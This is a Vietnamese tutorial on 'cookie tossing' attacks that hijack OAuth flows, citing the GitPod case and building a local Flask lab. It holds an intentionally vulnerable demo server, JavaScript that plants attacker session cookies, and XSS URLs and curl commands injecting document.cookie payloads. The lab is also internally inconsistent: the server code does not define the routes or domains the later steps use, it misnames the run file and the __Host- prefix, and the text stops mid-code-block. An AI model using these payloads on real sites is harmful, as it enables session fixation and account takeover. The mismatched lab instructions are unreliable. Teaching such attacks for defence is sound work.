# Hijacking OAuth Flows via Cookie Tossing

**Tác giả:** Elliot Ward  
**Chia sẻ:**  
Tìm hiểu về **tấn công Cookie Tossing**, một kỹ thuật ít được biết đến để chiếm quyền điều khiển luồng OAuth và thực hiện chiếm đoạt tài khoản tại các Nhà cung cấp Danh tính (IdPs). Khám phá tác động, ví dụ thực tế, cách thiết lập môi trường test (bao gồm khai thác XSS và ghi đè cookie), và cách bảo vệ ứng dụng bằng tiền tố cookie **__Host__**.

## Nội dung bài viết
- [Cookie Tossing là gì?](#cookie-tossing-là-gì)
- [Khai thác Cookie Tossing](#khai-thác-cookie-tossing)
- [Thăm lại GitPod](#thăm-lại-gitpod)
- [Cấu hình môi trường test](#cấu-hình-môi-trường-test)
- [Tiền tố cookie __Host__](#tiền-tố-cookie-__host__)

## Cookie Tossing là gì?

**Cookie Tossing** là kỹ thuật cho phép một **subdomain** (ví dụ: `securitylabs.snyk.io`) thiết lập cookie trên **domain cha** (ví dụ: `snyk.io`). Kỹ thuật này thường bị bỏ qua hoặc ít được biết đến, dẫn đến ít tài liệu nghiên cứu. Bài viết này giải thích chi tiết cách Cookie Tossing có thể chiếm quyền điều khiển luồng OAuth và gây ra chiếm đoạt tài khoản tại Nhà cung cấp Danh tính (IdP).

### HTTP Cookies là gì?

Theo chuẩn **RFC 6265**, **cookie** là một mẩu dữ liệu nhỏ được trao đổi giữa máy chủ và trình duyệt web của người dùng. Cookie rất quan trọng trong các ứng dụng web vì chúng:
- Lưu trữ dữ liệu giới hạn.
- Duy trì trạng thái (state) cho giao thức HTTP vốn không lưu trạng thái.
- Cho phép duy trì phiên người dùng, lưu trữ tùy chọn và cung cấp trải nghiệm cá nhân hóa.

#### Các thuộc tính và cờ của cookie

Cookie có các **thuộc tính (attributes)** và **cờ (flags)** định nghĩa hành vi và phạm vi của chúng. Dưới đây là các thuộc tính và cờ chính:

| Thuộc tính   | Mô tả | Ví dụ |
|-------------|-------|-------|
| Expires     | Đặt ngày và giờ hết hạn của cookie. | `Expires=Wed, 21 Oct 2024 07:28:00 GMT` |
| Max-Age     | Xác định thời gian sống của cookie (tính bằng giây). | `Max-Age=3600` (1 giờ) |
| Domain      | Chỉ định domain mà cookie có hiệu lực, cho phép các subdomain truy cập. | `Domain=.example.com` |
| Path        | Giới hạn cookie cho một đường dẫn cụ thể trong domain. | `Path=/account` |
| SameSite    | Kiểm soát việc gửi cookie trong các yêu cầu cross-site để bảo vệ chống CSRF. Giá trị: `Strict`, `Lax`, `None`. | `SameSite=Lax` |

| Cờ         | Mô tả | Ví dụ |
|------------|-------|-------|
| Secure     | Đảm bảo cookie chỉ được gửi qua HTTPS. | `Secure` |
| HttpOnly   | Ngăn cookie bị truy cập qua JavaScript, tăng cường bảo mật. | `HttpOnly` |

Những thuộc tính và cờ này xác định thời gian sống, phạm vi và bảo mật của cookie, giúp quản lý phiên người dùng một cách hiệu quả và an toàn.

### Cách thiết lập cookie

Cookie có thể được thiết lập bằng hai cách chính:

1. **Sử dụng header Set-Cookie trong phản hồi HTTP**:
```
HTTP/1.1 200 OK
Set-Cookie: userId=patch01; Expires=Wed, 21 Oct 2024 07:28:00 GMT; Domain=.example.com; Path=/; Secure; HttpOnly; SameSite=Lax
```

2. **Sử dụng JavaScript Cookie API**:
```javascript
document.cookie = "userId=patch01; expires=Wed, 21 Oct 2024 07:28:00 GMT; path=/; domain=.example.com; secure; samesite=lax";
```

Trong trình duyệt, cookie được lưu trữ dưới dạng **tuple** gồm **key**, **value** và **các thuộc tính**. Khi trình duyệt gửi cookie về máy chủ, chỉ **key** và **value** được gửi, không bao gồm các thuộc tính. Trình duyệt giới hạn số lượng cookie tối đa cho mỗi domain.

### Cookie Domains

Thuộc tính **Domain** xác định domain nào có thể truy cập cookie. Mặc định, cookie chỉ có hiệu lực với domain đã thiết lập nó. Tuy nhiên, thuộc tính **Domain** có thể mở rộng phạm vi truy cập. Ví dụ:
- Nếu `blog.example.com` đặt cookie với `Domain=.example.com`, cookie này sẽ khả dụng cho tất cả subdomain của `example.com` (như `app.example.com`, `example.com`).
- Ngược lại, domain cha (`example.com`) không thể đặt cookie chỉ dành riêng cho một subdomain cụ thể (như `blog.example.com`).

### Cookie Paths và Thứ tự

Thuộc tính **Path** xác định các URL mà cookie áp dụng. Mặc định, cookie có hiệu lực với đường dẫn của URL tạo ra nó và các thư mục con. Ví dụ:
- Cookie với `Path=/account` sẽ khả dụng cho `/account` và `/account/settings`.
- Cookie được ưu tiên theo **độ cụ thể** của **Path**: cookie với đường dẫn cụ thể hơn (như `/account/settings`) được gửi trước cookie với đường dẫn ít cụ thể hơn (như `/account`).

## Khai thác Cookie Tossing

**Cookie Tossing** lợi dụng thuộc tính **Domain** và **Path** để tấn công. Khi kẻ tấn công kiểm soát một subdomain (qua lỗ hổng XSS hoặc thiết kế của dịch vụ), họ có thể đặt cookie trên domain cha. Điều này có thể dẫn đến:
- Thiết lập cookie phiên của kẻ tấn công trên trình duyệt của nạn nhân cho các endpoint cụ thể.
- Ví dụ: Kẻ tấn công đặt cookie với `Domain=.example.com` và `Path=/api/payment`. Khi nạn nhân truy cập endpoint này, ứng dụng sẽ sử dụng cookie của kẻ tấn công thay vì cookie của nạn nhân, dẫn đến việc thông tin nhạy cảm (như phương thức thanh toán) bị thêm vào tài khoản của kẻ tấn công.

### Thách thức khi khai thác
- **CSRF tokens**: Nếu ứng dụng sử dụng token chống CSRF, yêu cầu hợp pháp từ nạn nhân có thể thất bại do token không khớp.
- Tuy nhiên, nhiều API dựa trên JSON không sử dụng CSRF tokens, dựa vào **Same Origin Policy (SOP)** và **CORS**. Điều này khiến chúng dễ bị tấn công từ subdomain.
- **SameSite** không bảo vệ chống lại Cookie Tossing vì subdomain được coi là cùng "site" theo định nghĩa của SameSite (kể cả với `Lax` hoặc `Strict`).

##  GitPod

**GitPod** là một môi trường phát triển đám mây (Cloud Development Environment - CDE) cho phép triển khai môi trường phát triển nhanh chóng. Các môi trường này được lưu trữ trên subdomain của `gitpod.io`, và người dùng có thể thực thi JavaScript trên các subdomain này.

### Tấn công Cookie Tossing trên GitPod
Các nhà nghiên cứu đã kiểm tra luồng OAuth của GitPod với các nhà cung cấp như GitHub hoặc BitBucket. Bằng cách:
1. Tạo JavaScript trên một instance GitPod (như `redacted.ws–eu114.gitpod.io`) để đặt cookie `_gitpod_io_jwt2_` với giá trị phiên của kẻ tấn công, với đường dẫn:
   - `/api/authorize`
   - `/auth/bitbucket/callback`
2. Gửi URL của workspace chứa JavaScript độc hại đến nạn nhân.

Khi nạn nhân truy cập URL, cookie của kẻ tấn công được thiết lập. Khi nạn nhân kết nối tài khoản GitHub/BitBucket, luồng OAuth sẽ sử dụng cookie của kẻ tấn công, dẫn đến việc tài khoản Git của nạn nhân bị liên kết với tài khoản GitPod của kẻ tấn công. Điều này cho phép kẻ tấn công:
- Tạo workspace từ các kho mã nguồn của nạn nhân.
- Thay đổi mã nguồn hoặc đẩy commit mới.

### Kết quả
Lỗ hổng này được báo cáo cho GitPod vào ngày **26/06/2024** và được khắc phục vào ngày **01/07/2024** bằng cách sử dụng tiền tố cookie **__Host__**. Lỗ hổng được gán mã **CVE-2024-21583**.

## Cấu hình môi trường test

Để kiểm tra hoặc tái hiện tấn công **Cookie Tossing**, bạn có thể thiết lập một môi trường thử nghiệm cục bộ sử dụng **Python** với framework **Flask** để tạo server đơn giản với domain cha và subdomain. Phần này bao gồm:
- Ví dụ sử dụng **lỗ hổng XSS** để thiết lập cookie độc hại trên subdomain.
- Kiểm tra việc **ghi đè cookie** khi root domain đã thiết lập cookie trước đó, minh họa cách subdomain ghi đè cookie của domain cha.

### Yêu cầu
- **Python** (phiên bản 3.8 trở lên).
- **pip** để cài đặt các gói.
- Trình duyệt web (Chrome, Firefox, v.v.).
- File cấu hình DNS cục bộ (`hosts`) để giả lập subdomain.

### Các bước thiết lập

1. **Cài đặt Python và Flask**:
   - Cài Python từ [python.org](https://www.python.org).
   - Tạo một thư mục dự án:
     ```
     mkdir cookie-tossing-test
     cd cookie-tossing-test
     pip install flask markupsafe
     ```

2. **Tạo server đơn giản**:
   - Tạo file `server.py` để mô phỏng một ứng dụng web với domain cha, subdomain, một endpoint có lỗ hổng XSS, và một endpoint để kiểm tra ghi đè cookie:
```python
from flask import Flask, request, make_response, jsonify

app = Flask(__name__)

# ==================== CONFIG ====================
VICTIM_DOMAIN = 'victim.com'
SUBDOMAIN = 'malicious.victim.com'

# ==================== TRANG CHỨA TẤT CẢ BƯỚC ====================
@app.route('/')
def index():
    """Trang chính chứa tất cả các bước"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Demo Cookie Tossing Attack</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .step { background: #f5f5f5; padding: 20px; margin: 20px 0; border-left: 5px solid #007cba; }
            .step h3 { margin-top: 0; }
            .btn { background: #007cba; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px 5px; }
            .btn.danger { background: #dc3545; }
            .btn.success { background: #28a745; }
            .note { background: #fff3cd; padding: 10px; border-left: 5px solid #ffc107; margin: 10px 0; }
        </style>
    </head>
    <body>
        <h1>🚨 Demo Cookie Tossing Attack</h1>
        <p>Thực hiện từng bước để hiểu rõ cuộc tấn công</p>

        <div class="step">
            <h3>BƯỚC 1: Đăng nhập vào ứng dụng chính</h3>
            <p>Người dùng đăng nhập vào victim.com và nhận cookie session</p>
            <a class="btn" href="/step1-login">Bắt đầu đăng nhập</a>
        </div>

        <div class="step">
            <h3>BƯỚC 2: Truy cập trang subdomain (attacker)</h3>
            <p>Người dùng click link đến trang khuyến mãi trên subdomain</p>
            <p class="note">Lưu ý: Phải hoàn thành bước 1 trước</p>
            <a class="btn" href="/step2-subdomain">Truy cập subdomain</a>
        </div>

        <div class="step">
            <h3>BƯỚC 3: Attacker thực hiện Cookie Tossing</h3>
            <p>Trang subdomain set cookie độc hại cho domain chính</p>
            <p class="note">Lưu ý: Phải hoàn thành bước 2 trước</p>
            <a class="btn danger" href="/step3-cookie-tossing">Thực hiện tấn công</a>
        </div>

        <div class="step">
            <h3>BƯỚC 4: Người dùng thực hiện OAuth</h3>
            <p>Người dùng quay lại ứng dụng chính và kết nối OAuth</p>
            <p class="note">Lưu ý: Phải hoàn thành bước 3 trước</p>
            <a class="btn" href="/step4-oauth">Kết nối OAuth</a>
        </div>

        <div class="step">
            <h3>BƯỚC 5: Kiểm tra kết quả</h3>
            <p>Xem kết quả tấn công và phiên bản an toàn</p>
            <a class="btn" href="/step5-result">Xem kết quả</a>
            <a class="btn success" href="/secure-version">Phiên bản an toàn</a>
        </div>

        <div class="step">
            <h3>Kiểm tra cookies hiện tại</h3>
            <a class="btn" href="/check-cookies">Kiểm tra cookies</a>
        </div>
    </body>
    </html>
    '''

# ==================== BƯỚC 1: ĐĂNG NHẬP ====================
@app.route('/step1-login')
def step1_login():
    """Bước 1: Đăng nhập vào ứng dụng chính"""
    response = make_response('''
    <h1>BƯỚC 1: Đăng nhập vào victim.com</h1>
    <p>Người dùng đăng nhập và nhận cookie session</p>
    
    <form action="/do-login" method="POST">
        <button type="submit">Đăng nhập</button>
    </form>
    
    <div class="note">
        <p><strong>Cookie được set:</strong> session=user123</p>
        <p><strong>VULNERABLE:</strong> Cookie không dùng __Host- prefix</p>
    </div>
    
    <a class="btn" href="/">← Quay lại</a>
    ''')
    return response

@app.route('/do-login', methods=['POST'])
def do_login():
    """Xử lý đăng nhập"""
    response = make_response('''
    <h1>✅ Đăng nhập thành công!</h1>
    <p>Cookie "session=user123" đã được thiết lập</p>
    
    <div class="note">
        <p><strong>ĐIỀU KIỆN 1:</strong> Người dùng đã có session hợp lệ</p>
        <p><strong>ĐIỀU KIỆN 2:</strong> Cookie không an toàn (không có __Host- prefix)</p>
    </div>
    
    <a class="btn" href="/step2-subdomain">Tiếp tục BƯỚC 2 →</a>
    <a class="btn" href="/">Quay lại trang chính</a>
    ''')
    
    # VULNERABLE: Cookie không an toàn
    response.set_cookie('session', 'user123', 
                       domain=VICTIM_DOMAIN,
                       path='/', 
                       httponly=False)
    return response

# ==================== BƯỚC 2: TRUY CẬP SUBDOMAIN ====================
@app.route('/step2-subdomain')
def step2_subdomain():
    """Bước 2: Truy cập subdomain của attacker"""
    session = request.cookies.get('session')
    if not session:
        return '''
        <h1>❌ Chưa đăng nhập</h1>
        <p>Vui lòng đăng nhập trước khi truy cập subdomain</p>
        <a class="btn" href="/step1-login">Đăng nhập ngay</a>
        '''
    
    return f'''
    <h1>BƯỚC 2: Truy cập subdomain {SUBDOMAIN}</h1>
    <p>Người dùng click link đến trang "khuyến mãi" trên subdomain</p>
    
    <div class="note">
        <p><strong>Session hiện tại:</strong> {session}</p>
        <p><strong>ĐIỀU KIỆN 3:</strong> Attacker kiểm soát subdomain</p>
    </div>
    
    <a class="btn danger" href="http://{SUBDOMAIN}:5000/step3-cookie-tossing" target="_blank">
        Truy cập trang khuyến mãi (subdomain) →
    </a>
    
    <p><em>Trang sẽ mở trong tab mới. Sau khi thực hiện tấn công, quay lại tab này.</em></p>
    
    <a class="btn" href="/">← Quay lại</a>
    '''

# ==================== BƯỚC 3: COOKIE TOSSING TRÊN SUBDOMAIN ====================
@app.route('/step3-cookie-tossing')
def step3_cookie_tossing():
    """Bước 3: Attacker thực hiện Cookie Tossing từ subdomain"""
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Trang Khuyến Mãi - {SUBDOMAIN}</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; }}
            .btn {{ background: #dc3545; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }}
            .warning {{ background: #f8d7da; padding: 15px; border-left: 5px solid #dc3545; }}
        </style>
    </head>
    <body>
        <h1>🎁 Trang Khuyến Mãi Đặc Biệt</h1>
        <p>Chào mừng bạn đến với <strong>{SUBDOMAIN}</strong></p>
        
        <div class="warning">
            <h3>🚨 ATTACKER CONTROLLED PAGE</h3>
            <p>Trang này được kiểm soát bởi attacker để thực hiện Cookie Tossing</p>
        </div>
        
        <p>Nhấn nút bên dưới để nhận quà tặng đặc biệt:</p>
        
        <button onclick="performCookieTossing()">🎯 Nhận Quà Tặng Miễn Phí</button>
        
        <script>
            function performCookieTossing() {{
                // ✅ ĐIỀU KIỆN 4: Chạy JavaScript trên subdomain
                // ✅ ĐIỀU KIỆN 5: Set cookie cho domain cha
                document.cookie = "session=attacker456; domain={VICTIM_DOMAIN}; path=/";
                
                alert("✅ Đã nhận quà tặng!\\\\n\\\\nCookie attacker đã được set: session=attacker456\\\\nCho domain: {VICTIM_DOMAIN}");
                
                // Quay lại ứng dụng chính
                window.opener = null;
                window.open('http://{VICTIM_DOMAIN}:5000/step4-oauth', '_blank');
            }}
        </script>
        
        <div class="warning">
            <p><strong>Kỹ thuật Cookie Tossing:</strong></p>
            <ul>
                <li>Subdomain set cookie cho domain cha</li>
                <li>Cookie có cùng tên "session" nhưng giá trị của attacker</li>
                <li>Trình duyệt sẽ gửi cookie attacker thay vì cookie thật</li>
            </ul>
        </div>
    </body>
    </html>
    '''

# ==================== BƯỚC 4: THỰC HIỆN OAUTH ====================
@app.route('/step4-oauth')
def step4_oauth():
    """Bước 4: Người dùng thực hiện kết nối OAuth"""
    session = request.cookies.get('session')
    
    if not session:
        return '''
        <h1>❌ Không có session</h1>
        <p>Vui lòng đăng nhập trước</p>
        <a class="btn" href="/step1-login">Đăng nhập</a>
        '''
    
    return f'''
    <h1>BƯỚC 4: Kết nối OAuth với GitHub</h1>
    <p>Người dùng thực hiện kết nối OAuth sau khi nhận "quà tặng"</p>
    
    <div class="note">
        <p><strong>Session hiện tại:</strong> {session}</p>
        <p><strong>ĐIỀU KIỆN 6:</strong> Endpoint OAuth chỉ kiểm tra cookie</p>
    </div>
    
    <a class="btn danger" href="/oauth-callback?code=github_auth_code">
        Kết nối OAuth với GitHub →
    </a>
    
    <a class="btn" href="/">← Quay lại</a>
    '''

# ==================== BƯỚC 5: KẾT QUẢ ====================
@app.route('/oauth-callback')
def oauth_callback():
    """Endpoint OAuth callback - bị tấn công"""
    session = request.cookies.get('session')
    
    if session == 'attacker456':
        result = '''
        <div style="background: #f8d7da; padding: 20px; border: 2px solid #dc3545;">
            <h1>❌ OAuth BỊ HIJACKED!</h1>
            <p><strong>Tài khoản GitHub đã kết nối với ATTACKER!</strong></p>
            <p>Session attacker: <strong>attacker456</strong></p>
            <p>Kẻ tấn công đã chiếm quyền điều khiển OAuth flow thành công!</p>
        </div>
        '''
    elif session == 'user123':
        result = '''
        <div style="background: #d1ecf1; padding: 20px; border: 2px solid #0c5460;">
            <h1>✅ OAuth Thành công</h1>
            <p>Tài khoản GitHub đã kết nối với USER thật</p>
            <p>Session user: <strong>user123</strong></p>
        </div>
        '''
    else:
        result = f'<h1>Session không xác định: {session}</h1>'
    
    return f'''
    <h1>BƯỚC 5: Kết quả OAuth Callback</h1>
    {result}
    
    <div class="note">
        <h3>Phân tích kết quả:</h3>
        <p>Endpoint /oauth-callback chỉ kiểm tra cookie session mà không có:</p>
        <ul>
         
            <li>❌ Additional authentication checks</li>
            <li>❌ Cookie prefix protection</li>
        </ul>
    </div>
    
    <a class="btn" href="/step5-result">Xem tổng kết →</a>
    <a class="btn" href="/">← Quay lại</a>
    '''

@app.route('/step5-result')
def step5_result():
    """Tổng kết kết quả"""
    return '''
    <h1>🎯 TỔNG KẾT COOKIE TOSSING ATTACK</h1>
    
    <div style="background: #fff3cd; padding: 20px; margin: 20px 0;">
        <h3>✅ TẤT CẢ 6 ĐIỀU KIỆN ĐƯỢC ĐÁP ỨNG:</h3>
        <ol>
            <li><strong>Người dùng có session</strong> - Đã đăng nhập trên victim.com</li>
            <li><strong>Cookie không an toàn</strong> - Không dùng __Host- prefix</li>
            <li><strong>Attacker kiểm soát subdomain</strong> - malicious.victim.com</li>
            <li><strong>Chạy JavaScript trên subdomain</strong> - document.cookie</li>
            <li><strong>Set cookie cho domain cha</strong> - Domain=victim.com</li>
            <li><strong>Endpoint nhạy cảm chỉ dùng cookie</strong> - /oauth-callback</li>
        </ol>
    </div>
    
    <a class="btn success" href="/secure-version">Xem phiên bản an toàn →</a>
    <a class="btn" href="/">Bắt đầu lại</a>
    '''

# ==================== PHIÊN BẢN AN TOÀN ====================
@app.route('/secure-version')
def secure_version():
    """Phiên bản an toàn với __Host- prefix"""
    return '''
    <h1>🛡️ Phiên bản an toàn với __Host- Cookie Prefix</h1>
    
    <div style="background: #d4edda; padding: 20px; margin: 20px 0;">
        <h3>Cách phòng chống Cookie Tossing:</h3>
        <p>Sử dụng <strong>__Host-</strong> cookie prefix:</p>
        <ul>
            <li>✅ Cookie chỉ được set từ exact domain</li>
            <li>✅ Không thể set từ subdomain</li>
            <li>✅ Phải có Secure flag (trong production)</li>
            <li>✅ Phải có Path=/</li>
            <li>✅ Không có Domain attribute</li>
        </ul>
    </div>
    
    <a class="btn" href="/secure-login">Đăng nhập phiên bản an toàn</a>
    <a class="btn" href="/">← Quay lại demo</a>
    '''

@app.route('/secure-login')
def secure_login():
    """Đăng nhập phiên bản an toàn"""
    response = make_response('''
    <h1>✅ Đăng nhập an toàn thành công</h1>
    
    <div style="background: #d4edda; padding: 15px;">
        <p><strong>Cookie an toàn được set:</strong> __Host-session=user123_secure</p>
        <p><strong>Bảo vệ:</strong> __Host- prefix ngăn chặn Cookie Tossing</p>
    </div>
    
    <div style="background: #fff3cd; padding: 15px; margin: 15px 0;">
        <h3>⚠️ LƯU Ý DEMO:</h3>
        <p>Trong môi trường production với HTTPS, __Host- prefix sẽ được browser enforced.</p>
        <p>Demo này chạy HTTP nên prefix chủ yếu để minh họa concept.</p>
    </div>
    
    <div style="background: #d1ecf1; padding: 15px; margin: 15px 0;">
        <h3>🔒 COOKIE AN TOÀN:</h3>
        <ul>
            <li>Tên: <strong>__Host-session</strong> (có prefix)</li>
            <li>Giá trị: <strong>user123_secure</strong></li>
            <li>Domain: <strong>Không có attribute</strong> (chỉ victim.com)</li>
            <li>Path: <strong>/</strong></li>
            <li>Secure: <strong>True</strong> (trong production)</li>
        </ul>
    </div>
    
    <p>Cookie này <strong>KHÔNG THỂ</strong> bị ghi đè từ subdomain!</p>
    
    <a class="btn" href="/secure-attack-test">Thử tấn công →</a>
    <a class="btn" href="/secure-demo">← Quay lại</a>
    ''')
    
    # SECURE: Dùng __Host- prefix 
    # Trong production phải có secure=True, nhưng demo HTTP tạm dùng secure=False
    response.set_cookie('__Host-session', 'user123_secure',
                       path='/',
                       secure=False,  # Trong demo HTTP tạm dùng False
                       httponly=True,
                       samesite='Lax')
    return response

@app.route('/secure-oauth')
def secure_oauth():
    """OAuth phiên bản an toàn"""
    session = request.cookies.get('__Host-session')
    return f'''
    <h1>🛡️ OAuth an toàn</h1>
    <p>Session an toàn: <strong>{session}</strong></p>
    <p>Cookie với __Host- prefix không thể bị ghi đè từ subdomain</p>
    
    <div style="background: #d4edda; padding: 15px;">
        <p>✅ OAuth flow được bảo vệ khỏi Cookie Tossing</p>
        <p>✅ Session không thể bị attacker chiếm đoạt</p>
        <p>✅ __Host- prefix ngăn subdomain set cookie cùng tên</p>
    </div>
    
    <a class="btn" href="/secure-demo">← Quay lại demo an toàn</a>
    '''
# ==================== KIỂM TRA COOKIES ====================
@app.route('/check-cookies')
def check_cookies():
    """Kiểm tra cookies hiện tại"""
    cookies = dict(request.cookies)
    return jsonify({
        'current_domain': request.host,
        'cookies': cookies,
        'message': 'Cookies hiện tại'
    })

if __name__ == '__main__':
    print(f"""
🚨 DEMO COOKIE TOSSING ATTACK - TỪNG BƯỚC 🚨

URL chính: http://{VICTIM_DOMAIN}:5000/

CÁC BƯỚC THỰC HIỆN:
1. Đăng nhập → 2. Truy cập subdomain → 3. Cookie Tossing → 4. OAuth → 5. Kết quả

Chạy với: python app.py
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True)
```

3. **Cấu hình DNS cục bộ**:
   - Chỉnh sửa file `hosts` trên máy tính để giả lập domain và subdomain:
     - Windows: `C:\Windows\System32\drivers\etc\hosts`
     - macOS/Linux: `/etc/hosts`
   - Thêm các dòng sau:
     ```
     127.0.0.1 example.com
     127.0.0.1 sub.example.com
     ```

4. **Chạy server**:
   - Chạy lệnh:
     ```
     python server.py
     ```
   - Truy cập:
     - Domain cha: `http://example.com:5000`
     - Subdomain: `http://sub.example.com:5000/sub`
     - XSS endpoint: `http://sub.example.com:5000/sub/xss`
     - Override endpoint: `http://sub.example.com:5000/override`
     - API endpoint: `http://example.com:5000/api`
     - Check endpoint: `http://example.com:5000/check`

5. **Kiểm tra tấn công Cookie Tossing thông qua XSS**:
   - Trước khi thực thi
     <img width="434" height="104" alt="image" src="https://github.com/user-attachments/assets/90fe546e-a90f-49b5-81a5-03d3f0cf88d1" />
   - **Khai thác XSS để đặt cookie**:
   - Truy cập URL sau để chèn mã JavaScript độc hại qua lỗ hổng XSS:
       ```
       http://sub.example.com:5000/sub/xss?input=<script>document.cookie="session=attacker-xss-session; domain=.example.com; path=/api; samesite=lax";</script>
       ```
     - Mã JavaScript này sẽ chạy trong trình duyệt của nạn nhân, thiết lập cookie `session=attacker-xss-session` với `Domain=.example.com` và `Path=/api`.
   - **Xác minh cookie**:
   - Mở Developer Tools trong trình duyệt (tab Application > Cookies) để kiểm tra xem cookie `session=attacker-xss-session` đã được thiết lập cho `example.com` chưa.
     <img width="1684" height="197" alt="image" src="https://github.com/user-attachments/assets/b9217793-215e-4915-a762-27f667a68358" />

   - **Kiểm tra tấn công**:
   - Truy cập `http://example.com:5000/api`. Nếu server trả về `API endpoint, session: attacker-xss-session`, tấn công Cookie Tossing qua XSS đã thành công, vì cookie từ XSS đã ghi đè cookie của domain cha cho endpoint `/api`.
     
   - Sau khi chạy XSS
     <img width="479" height="168" alt="image" src="https://github.com/user-attachments/assets/7e97b073-7885-4574-accd-5b55aef92572" />



7. **Kiểm tra tấn công Cookie Tossing thông qua route /sub**:
   - Truy cập `http://sub.example.com:5000/sub`. Bạn sẽ thấy thông báo: `Subdomain: sub.example.com - Cookie attacker-session đã được thiết lập`.
   - Mở Developer Tools (tab Application > Cookies) để xác minh rằng cookie `session=attacker-session` đã được thiết lập với `Domain=.example.com` và `Path=/api`.
   - Truy cập `http://example.com:5000/api`. Nếu server trả về `API endpoint, session: attacker-session`, tấn công Cookie Tossing đã thành công.

8. **Kiểm tra ghi đè cookie khi root domain đã thiết lập cookie**:
   - **Bước 1: Thiết lập cookie từ root domain**:
     - Truy cập `http://example.com:5000` để thiết lập cookie `session=parent-session` với `Domain=.example.com` và `Path=/`.
     - Kiểm tra trong Developer Tools (tab Application > Cookies) để xác minh cookie `session=parent-session` đã được thiết lập.
     - 
       <img width="1422" height="227" alt="image" src="https://github.com/user-attachments/assets/ee01f6ac-c146-44b5-9960-4deab6c5f824" />

   - **Bước 2: Thử ghi đè từ subdomain với Path cụ thể hơn**:
     - Truy cập `http://sub.example.com:5000/sub` để thiết lập cookie `session=attacker-session` với `Path=/api`.
     - Truy cập `http://example.com:5000/api`. Server sẽ trả về `API endpoint, session: attacker-session`, vì cookie với `Path=/api` được ưu tiên hơn `Path=/` cho endpoint `/api`.
       
       <img width="576" height="148" alt="image" src="https://github.com/user-attachments/assets/c3e882bd-bfb9-4bcb-8c6e-93fa6e3a7c68" />
       
     - Truy cập `http://example.com:5000/check`. Server sẽ trả về `Check endpoint, session: parent-session`, vì endpoint `/check` không nằm trong `Path=/api`, nên cookie `parent-session` với `Path=/` được sử dụng.
       
       <img width="464" height="114" alt="image" src="https://github.com/user-attachments/assets/74e3dfd3-dfd5-45cf-8feb-c91781b0b956" />


   - **Bước 3: Thử ghi đè từ subdomain với cùng Path=/**:
     - Truy cập `http://sub.example.com:5000/sub/override` để thiết lập cookie `session=override-session` với `Path=/`.
    
       <img width="661" height="131" alt="image" src="https://github.com/user-attachments/assets/6ce48234-4ccc-46b9-a75c-4e25c96d5040" />

     - Truy cập `http://example.com:5000/check`. Server sẽ trả về `Check endpoint, session: override-session`, vì cookie `override-session` được thiết lập sau cùng và có cùng `Path=/` nên ghi đè cookie `parent-session`.

       <img width="524" height="144" alt="image" src="https://github.com/user-attachments/assets/66c5f3d2-fb72-4f25-8dd8-9fc3711c313d" />

   - **Bước 4: Thử ghi đè qua XSS**:
     - Truy cập:
       ```
       http://sub.example.com:5000/sub/xss?input=<script>document.cookie="session=attacker-xss-session; domain=.example.com; path=/; samesite=lax";</script>
       ```
     - Truy cập `http://example.com:5000/check`. Server sẽ trả về `Check endpoint, session: attacker-xss-session`, vì cookie `attacker-xss-session` được thiết lập qua XSS với `Path=/` và ghi đè cookie trước đó.

### Xử lý lỗi khi cookie không được thiết lập
Nếu cookie không được thiết lập khi truy cập `/sub`, `/sub/xss`, hoặc `/override`, hãy kiểm tra các vấn đề sau:
- **Lỗi ImportError với `escape`**:
  - Nếu bạn gặp lỗi `ImportError: cannot import name 'escape' from 'flask'`, điều này do Flask phiên bản mới (2.3.0 trở lên) không còn export hàm `escape`. Code trên đã sử dụng `from markupsafe import escape`. Đảm bảo cài đặt gói `markupsafe`:
    ```
    pip install markupsafe
    ```
- **HTTPS và Secure flag**: Code trên đã loại bỏ `secure=True` để phù hợp với localhost (HTTP). Nếu bạn thêm `secure=True`, trình duyệt sẽ từ chối cookie trên HTTP. Hãy thử thiết lập HTTPS cục bộ (sử dụng `mkcert` hoặc `OpenSSL`) nếu cần.
- **Cấu hình file hosts**: Đảm bảo file `hosts` có các dòng:
  ```
  127.0.0.1 example.com
  127.0.0.1 sub.example.com
  ```
  Nếu subdomain không được ánh xạ đúng, cookie sẽ không được thiết lập.
- **Cú pháp cookie**: Trong các route, kiểm tra cú pháp `response.set_cookie`. Đảm bảo `domain='.example.com'` (dấu chấm đầu là cần thiết) và các thuộc tính khác như `path`, `httponly`, `samesite` đúng.
- **XSS không hoạt động**: Đảm bảo trình duyệt không chặn JavaScript. Trong Developer Tools (tab Console), kiểm tra xem có lỗi như `Refused to execute script` không. Nếu có, thử vô hiệu hóa các tính năng bảo mật của trình duyệt (chỉ trong môi trường test).
- **Cổng server**: Đảm bảo truy cập đúng cổng `5000` (ví dụ: `http://sub.example.com:5000/sub`). Nếu cổng sai, server sẽ không phản hồi.
- **Kiểm tra header**: Sử dụng `curl` để kiểm tra response header:
  ```
  curl -v http://sub.example.com:5000/sub
  curl -v http://sub.example.com:5000/override
  curl -v http://sub.example.com:5000/sub/xss?input=<script>document.cookie="session=attacker-xss-session; domain=.example.com; path=/api; samesite=lax";</script>
  ```
  Đảm bảo header `Set-Cookie` xuất hiện với giá trị đúng.
- **Kiểm tra XSS payload**: Đảm bảo URL XSS được mã hóa đúng. Nếu trình duyệt hoặc server chặn `<script>`, thử mã hóa URL:
  ```
  http://sub.example.com:5000/sub/xss?input=%3Cscript%3Edocument.cookie%3D%22session%3Dattacker-xss-session%3B%20domain%3D.example.com%3B%20path%3D%2Fapi%3B%20samesite%3Dlax%22%3B%3C%2Fscript%3E
  ```

### Công cụ đề xuất
- **cURL** để kiểm tra response header:
  ```
  curl -v http://sub.example.com:5000/sub
  curl -v http://sub.example.com:5000/override
  curl -v http://sub.example.com:5000/sub/xss?input=<script>document.cookie="session=attacker-xss-session; domain=.example.com; path=/api; samesite=lax";</script>
  ```
- **Postman** để gửi yêu cầu và xem cookie.
- Developer Tools của trình duyệt (tab Network hoặc Application > Cookies) để xác minh cookie.

### Kiểm tra tiền tố __Host__
Để kiểm tra tác động của tiền tố `__Host__`, sửa cookie của domain cha trong `server.py` thành:
```python
response.set_cookie('session', 'parent-session', path='/', httponly=True, samesite='Lax')
